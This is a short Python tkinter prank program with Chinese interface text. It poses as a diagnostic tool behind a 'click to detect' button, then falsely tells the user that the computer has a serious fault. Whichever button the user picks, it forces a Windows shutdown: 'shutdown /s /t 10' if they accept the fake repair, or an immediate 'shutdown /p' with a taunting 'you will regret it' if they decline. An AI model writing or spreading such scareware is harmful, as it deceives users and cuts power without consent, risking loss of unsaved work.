import tkinter as tk
from tkinter import messagebox
import os
i = tk.Tk()





def 呃呃呃呃():

    if tk.messagebox.askokcancel('错误','你的电脑出现了很严重的问题，是否修复'):
        tk.messagebox.showinfo('错误','修复失败,10秒后关机')
        os.system('shutdown /s /t 10 ')
    else:
        tk.messagebox.showinfo('错误','系统提醒您：您会后悔的!')
        os.system("shutdown /p")




c_1 = tk.Button(text='点击检测',command=呃呃呃呃)





c_1.pack()
i.title('lz')
i.mainloop()
